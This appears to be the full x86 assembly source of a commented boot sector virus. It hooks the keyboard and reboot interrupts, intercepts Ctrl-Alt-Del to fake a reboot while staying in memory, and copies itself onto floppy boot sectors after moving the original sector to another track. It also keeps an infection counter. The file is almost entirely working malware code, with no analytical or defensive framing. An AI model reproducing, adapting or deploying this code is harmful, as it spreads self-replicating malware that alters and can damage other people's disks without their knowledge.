﻿


INTVEC          SEGMENT AT 0
                ASSUME  CS:INTVEC

                ORG     7C00H
L7C00H:         DB      (?)

INTVEC          ENDS


BIOSDAT         SEGMENT AT 0040H

                ORG     10H
L10H            DW      (?)
                ORG     13H
L13H            DW      (?)             ;Top of memory
                ORG     17H
L17H            DB      (?)
                ORG     72H
L72H            DW      (?)

BIOSDAT         ENDS

BIOSROM         SEGMENT at 0F000H

                ORG     0E502H
LE502H          DW      (?)

BIOSROM         ENDS

MAIN    SEGMENT BYTE
        ASSUME  CS:MAIN,DS:MAIN,ES:MAIN,SS:MAIN

                ORG     24H

INT9VEC         DD      (?)

                ORG     64H

INT19VEC        DD      (?)

                ORG     410H

L410H           DW      (?)

                ORG     413H

L413H           DW      (?)             ;duplication of BIOS L13H

                ORG     7C00H

STACK           LABEL   WORD

VIRUS:
                cli
                xor     ax,ax
                mov     ss,ax                   ;set up stack
                mov     sp,OFFSET STACK
                sti
                mov     bx,40H
                mov     ds,bx

        ASSUME  DS:BIOSDAT

                mov     ax,[L13H]               ;get memory size in kb
                mul     bx                      ;a nasty little trick here to get the segment count in ax
                                                ;ax = # of 400H size blocks of memory, bx = 40H, ax*bx = # of 10H size blocks
                sub     ax,07E0H                ;segment required to execute this program
                                                ;at offset 7C00H, leaving 200H of space for the code
                mov     es,ax                   ;still segment MAIN

                push    cs                      ;set DS=CS(=0, MAIN)
                pop     ds

        ASSUME  DS:MAIN

                cmp     di,3456H                ;if the virus is rebooting
                jne     SHORT VIRUS_1
                dec     WORD PTR [COUNTER]      ;then decrement counter
VIRUS_1:        mov     si,sp                   ;prepare to copy self to top of memory
                mov     di,si
                mov     cx,200H                 ;length of sector to copy
                rep     movsb                   ;and do the move
                mov     si,cx                   ;set si=0, since cx=0
                mov     di,OFFSET VIRUS - 80H   ;prepare to save the first 32 interrupt vectors in a special table
                mov     cx,80H                  ;just below this code
                rep     movsb                   ;and save them

                call    GRAB_INT9               ;redirect keyboard interrupt 9

                mov     ax,es                   ;do the jump to high memory
                mov     WORD PTR [JMP_HIGH+2],ax
                mov     ax,OFFSET HI_ENTRY
                mov     WORD PTR [JMP_HIGH],ax
                jmp     DWORD PTR [JMP_HIGH]

HI_ENTRY:
                push    ds                      ;es=ds=0
                pop     es

                mov     bx,sp                   ;now prepare to load real boot sector to 7C00
                mov     dx,cx                   ;dx=cx=0, bx=7C00
                mov     cx,2708H                ;prepare for bios call to read
                mov     ax,0201H                ;track 40 sector 8 head 0
                int     13H
                jb      $                       ;if an error reading it, loop here indefinitely
                jmp     BOOT_JUMP               ;and go execute original boot sector

;Take control of the keyboard interrupt.
GRAB_INT9:
                dec     WORD PTR [L413H]        ;decrement the top of memory segment so computer wont overwrite virus
                mov     si,4*9                  ;copy old interrupt 9 vector into memory
                mov     di,OFFSET OLD_INT9
                mov     al,0EAH                 ;put far jump instruction at OLD_INT9
                stosb
                mov     cx,4
                rep     movsb
                mov     WORD PTR [INT9VEC],OFFSET INT9
                mov     WORD PTR [INT9VEC+2],es ;and set up new interrupt vector
                ret

;Reset keyboard shift register to prepare it to accept another character, when
;CTRL-ALT-DEL sequence is complete. Normally this is handled by BIOS, but we
;want to circumvent BIOS here. Then go perform reboot sequence
SR_RESET:
                in      al,61H
                mov     ah,al
                or      al,80H
                out     61H,al
                xchg    al,ah
                out     61H,al
                jmp     REBOOT

;Keyboard interrupt 9 handler
INT9:
                sti                             ;interrupts back on
                push    ax                      ;save these
                push    bx
                push    ds
                push    cs                      ;ds=cs
                pop     ds
                mov     bx,[LAST_CODE]          ;get last scan code
                in      al,60H
                mov     ah,al
                and     ax,887FH                ;strip 8th bit in al, keep it in ah
                cmp     al,1DH                  ;is it ctrl?
                jne     INT9_1                  ;nope, continue looking
                mov     bl,ah                   ;bl=8 on key down, 88 on key up
                jmp     INT9_3                  ;and go process
INT9_1:         cmp     al,38H                  ;is it alt?
                jne     INT9_2                  ;nope, continue looking
                mov     bh,ah                   ;bh=8 on key down, 88 on key up
                jmp     INT9_3                  ;and go process
INT9_2:         cmp     bx,0808H                ;are ctrl and alt both down?
                jne     INT9_3                  ;no - continue processing
                cmp     al,17H                  ;if CTRL_ALT-I then go infect
                je      INT9_X0
                cmp     al,53H                  ;is it DEL?
                je      SR_RESET                ;yes - reset keyboard shift register and do reboot sequence
INT9_3:         mov     [LAST_CODE],bx          ;save this code for next time
INT9_4:         pop     ds                      ;get everything off the stack
                pop     bx
                pop     ax
OLD_INT9:       db      5 dup (0)               ;and go jump to the BIOS keyboard handler to handle normal keystrokes

INT9_X0:        jmp     INT9_X1                 ;need a near jump to get to this


;Reboot sequence
REBOOT:
                mov     dx,03D8H                ;disable color video if its there
                mov     ax,800H
                out     dx,al
                call    DELAY
                mov     [LAST_CODE],ax          ;zero this flag (ah=0 on return from DELAY)
                mov     al,3                    ;select 80x25 color (ah=0)
                int     10H                     ;select video mode via BIOS
                mov     ah,2                    ;set cursor position to 0,0
                xor     dx,dx
                mov     bh,dh                   ;on page 0
                int     10H
                mov     ah,1
                mov     cx,0607H                ;set cursor type
                int     10H
                mov     ax,420H                 ;do a delay, al=20H for EOI follwing delay
                call    DELAY
                cli
                out     20H,al                  ;send EOI to interrupt controller
                mov     es,cx                   ;es=cx=0 (cx=0 from DELAY)
                mov     di,cx                   ;prepare to restore 32 interrupt vectors
                mov     cx,80H
                mov     si,OFFSET VIRUS - 80H
                rep     movsb                   ;and move them
                mov     ds,cx                   ;ds=cx=0
                mov     WORD PTR [INT19VEC],OFFSET INT19
                mov     WORD PTR [INT19VEC+2],cs;set up new interrupt 19 handler
                mov     ax,40H
                mov     ds,ax                   ;ds = BIOS data area

        ASSUME  DS:BIOSDAT

                mov     [L17H],ah               ;zero keyboard shift states
                inc     WORD PTR [L13H]         ;increment memory size word (virus will reload itself)
                push    ds
                mov     ax,0F000H
                mov     ds,ax

        ASSUME  DS:BIOSROM

                cmp     WORD PTR [LE502H],21E4H ;is BIOS rom value at F000:E502 = 21E4?
                pop     ds

        ASSUME  DS:BIOSDAT

                je      REBOOT_1
                int     19H                     ;no, reboot using (new) interrupt 19H
REBOOT_1:       jmp     FAR PTR LE502H          ;else reboot by jumping here

INT19:
                xor     ax,ax
                mov     ds,ax                   ;ds=0

        ASSUME  DS:MAIN

                mov     ax,[L410H]              ;get equipment flag
                test    al,1                    ;if floppy drives, go on
                jnz     INT19_2                 ;this seems superfluous to me
INT19_1:        push    cs                      ;es=cs=high MAIN
                pop     es
                call    GRAB_INT9               ;set up keyboard interrupt again
                int     18H                     ;and load basic
INT19_2:        mov     cx,4                    ;set up retry count
INT19_3:        push    cx
                mov     ah,0
                int     13H                     ;reset floppy disk subsystem
                mov     ax,201H                 ;and read the boot sector
                push    ds
                pop     es                      ;es=0
                mov     bx,OFFSET VIRUS         ;es:bx buffer to load boot sector into
                mov     cx,1
                xor     dx,dx
                int     13H
                pop     cx
                jnc     INT19_4                 ;fine, it worked, go on
                loop    INT19_3                 ;otherwise try again
                jmp     INT19_1                 ;unless retry count expired, then load BASIC

INT19_4:        cmp     di,3456H                ;if flag is not set,
                jnz     INFECT                  ;then infect the disk

;HERE:           mov     ax,0E30H                ;DIAGNOSTIC
;                int     10H
;                jmp     HERE


BOOT_JUMP:      jmp     FAR PTR L7C00H          ;else go execute boot sector

INFECT:
                mov     si,OFFSET VIRUS         ;compare boot sector just loaded with this program
                mov     cx,OFFSET OLD_INT9 - OFFSET VIRUS - 1
                mov     di,si
                push    cs
                pop     es                      ;es = high MAIN
                cld
                repe    CMPSB
                je      INF_2                   ;equal, go do reboot, else infect it first

                inc     WORD PTR es:[COUNTER]   ;increment counter
;                mov     bx,OFFSET TABLE         ;make sure track 39, head 0 is formatted
                mov     dx,0
                mov     ch,39
                mov     ah,5                    ;by going and formatting it!
                jmp     INF_1                   ;remove format option for this version

                jc      INF_3                   ;this isn't executed
INF_1:          mov     es,dx                   ;write original boot sector at track 39, sector 8, head 0
                mov     bx,OFFSET VIRUS         ;es;bx = location of original boot sector
                mov     cl,8
                mov     ax,0301H
                int     13H
                push    cs
                pop     es
                jc      INF_3                   ;if error, then just execute original boot code
                mov     cx,1                    ;now write infected boot sector to head 0, track 0, sector 1
                mov     ax,301H
                mov     dx,0
                int     13H
                jc      INF_3

INF_2:          mov     di,3456H                ;set infected flag
                int     19H                     ;and reboot system

INF_3:          call    GRAB_INT9               ;set interrupt 9 up again
                dec     WORD PTR es:[COUNTER]   ;decrement counter, because it didn't infect
                jmp     BOOT_JUMP               ;and execute original boot code

INT9_X1:        mov     [LAST_CODE],bx
                mov     ax,[COUNTER]
                mov     bx,40H
                mov     ds,bx

        ASSUME  DS:BIOSDAT

                mov     [L72H],ax               ;reset flag set with infection counter

;Execute a short delay. ah:cx = loop count
DELAY:
                sub     cx,cx
                loop    $
                sub     ah,1
                jnz     DELAY
                ret

COUNTER         DW      1CH
LAST_CODE       DW      0
JMP_HIGH        DW      0,0             ;High jump location

                ORG     7DFEH

                DB      55H,0AAH        ;boot sector ID

MAIN    ENDS


        END VIRUS




